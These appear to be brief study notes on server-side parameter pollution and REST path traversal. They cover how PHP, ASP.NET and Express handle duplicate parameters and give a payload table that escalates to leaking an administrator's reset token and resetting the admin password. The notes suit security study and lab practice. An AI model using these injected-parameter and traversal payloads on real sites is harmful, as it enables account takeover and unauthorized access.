# MASS Assignment
# Parameter Pollution
?name=peter`%26email=foo`&back=/home

?name=peter`%26name=david`&back=/home

### Notes
* PHP parses only the last parameter, resulting in a user search for david.
* ASP.NET combines both parameters, resulting in a user search for peter,david, which may trigger an Invalid username error.
* Node.js (Express) parses only the first parameter, resulting in a user search for peter and therefore an unchanged result.

### Example
Payload | Result
--- | ---
administrator%26x=y | Parameter is not supported
administrator%23 | Field not specified
administrator%26field=x%23 | Invalid field
Brute Force field | found *email*
administrator%26field=email%23 | valid response
administrator%26field=reset_token%23 | response with reset token
/forgot-password?reset_token=${resetToken} | set admin pass

## Testing REST paths

GET /edit_profile.php?name=`peter%2f..%2fadmin`

Resulting in:
GET /api/private/users/peter/../admin   ->  /api/private/users/admin
